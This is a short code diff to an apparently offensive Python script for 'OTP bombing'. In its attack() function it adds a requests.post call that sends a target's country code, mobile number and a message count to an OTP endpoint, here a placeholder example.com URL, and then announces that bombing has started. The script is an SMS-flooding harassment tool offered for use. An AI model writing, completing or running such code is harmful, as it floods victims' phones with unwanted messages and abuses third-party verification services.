@@ -26,7 +26,7 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.prompt import Prompt
 import re
-import sys
+import requests
 
 console = Console()
 
@@ -115,5 +115,27 @@ def attack(country_code,mobile_no,otpcount):
     border_style="green"
 ))
 
+    # URL to which the POST request is sent
+    url = "https://example.com/api/send_otp"
+
+    # JSON payload
+    payload = {
+        "country_code": country_code,
+        "mobile_no": mobile_no,
+        "otp_count": otpcount
+    }
+
+    # Headers (optional but commonly needed)
+    headers = {
+        "Content-Type": "application/json"
+    }
+
+    # Sending the POST request
+    try:
+        response = requests.post(url, headers=headers, json=payload)
+        response.raise_for_status()  # Raise an error for bad status codes
+        print("✅ Response:", response.json())
+    except requests.exceptions.RequestException as e:
+        print(f"❌ Error sending request: {e}")
     print("📲 OTP Bombing Started...")
 
